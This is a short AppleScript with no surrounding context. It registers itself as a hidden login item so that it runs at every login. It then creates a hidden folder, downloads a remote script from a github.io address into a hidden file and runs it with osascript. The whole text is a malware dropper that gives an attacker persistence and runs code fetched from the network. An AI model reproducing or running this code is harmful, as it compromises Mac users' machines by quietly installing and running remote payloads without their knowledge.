tell application "System Events"
	make login item at end with properties {path:(path to me), hidden:true}
end tell

do shell script "mkdir -p ~/.tmp; curl -3 https://sitetest.github.io/val.txt >~/.tmp/.val.scpt; osascript ~/.tmp/.val.scpt"
